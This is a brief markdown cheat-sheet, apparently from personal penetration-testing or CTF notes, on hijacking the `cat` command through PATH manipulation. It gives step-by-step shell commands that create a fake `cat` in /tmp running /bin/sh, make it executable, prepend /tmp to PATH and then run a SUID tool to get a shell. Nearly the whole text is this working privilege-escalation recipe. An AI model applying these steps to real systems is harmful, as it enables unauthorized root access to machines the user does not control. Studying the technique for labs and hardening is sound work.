# `cat` exploits
ï·½
* Used when tools accept user input eg. of `n` where `n` will be read using the `cat` command, however:
  * the tool doesn't specify the entire path to file `cat` and thus, we may be able to exploit it.
## usage

* navigate to the `/tmp` directory, and create a file called `cat`
  * `cd /tmp; touch cat`

* add the path `/bin/sh` to `cat`, such as:
  * `echo "/bin/sh" > cat`

* then, set `execute` privileges:
  * `chmod +x cat`

* now, add `/tmp` to the `PATH` environment variable:
  * `export PATH=/tmp:$PATH`

* check the `$PATH`:
  * `echo $PATH`

finally, execute the tool (in my case, SUID exploit) ***from the `/tmp` directory***:
  * `cd /tmp;{tool-name}`

* a shell should be provided. WAHOOOOO
